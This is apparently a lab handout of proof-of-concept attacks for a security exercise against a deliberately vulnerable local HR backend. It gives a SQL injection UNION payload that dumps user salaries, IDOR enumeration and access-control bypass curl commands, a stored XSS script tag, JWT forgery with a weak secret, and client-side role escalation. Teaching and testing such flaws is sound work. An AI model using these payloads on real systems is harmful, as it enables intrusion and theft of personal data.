# PoC Scripts for Part 2 (The Break)

Use these against the **vulnerable** backend. Replace `BASE` and `TOKEN` with your values.

## 1. SQL Injection — dump salaries via search

```bash
BASE=http://localhost:3000
TOKEN=<your_jwt_or_cookie>

# Dump all users (and salaries) via UNION
curl -s "${BASE}/api/employees/search?name=' OR '1'='1' UNION SELECT id,name,email,role,department,salary,created_at FROM users--"
```

## 2. Broken Access Control — admin as regular user

```bash
curl -s -H "Authorization: Bearer $TOKEN" "${BASE}/api/admin/all-employees"
# With valid employee token: 200 + full list (vulnerable). After fix: 403.
```

## 3. Stored XSS

Submit a leave request with notes:
```html
<script>alert('XSS')</script>
```
Then open `http://localhost:3000/leave-view.html`, paste your JWT, Load. Alert should fire (vulnerable).

## 4. Password storage

```sql
SELECT id, email, password FROM users LIMIT 5;
```
Screenshot shows plaintext (or weak hash) before fix.

## 5. JWT forgery

Secret is `password123`. Forge admin:
```bash
# Use https://jwt.io or node -e "console.log(require('jsonwebtoken').sign({id:1,email:'a@a.com',role:'admin'}, 'password123'))"
# Use the token in Authorization header to call /api/admin/all-employees.
```

## 6. IDOR — enumerate employees

```bash
for i in $(seq 1 100); do
  curl -s -H "Authorization: Bearer $TOKEN" "${BASE}/api/employees/$i" | head -1
done
```
Any user token returns other users' profiles (vulnerable).

## 7. Client-side role escalation

In the app: set AsyncStorage `role` to `admin` (e.g. via dev tools or a debug screen), reload. Admin Panel appears and API calls succeed (vulnerable). After fix: role from JWT only; storage edit has no effect.
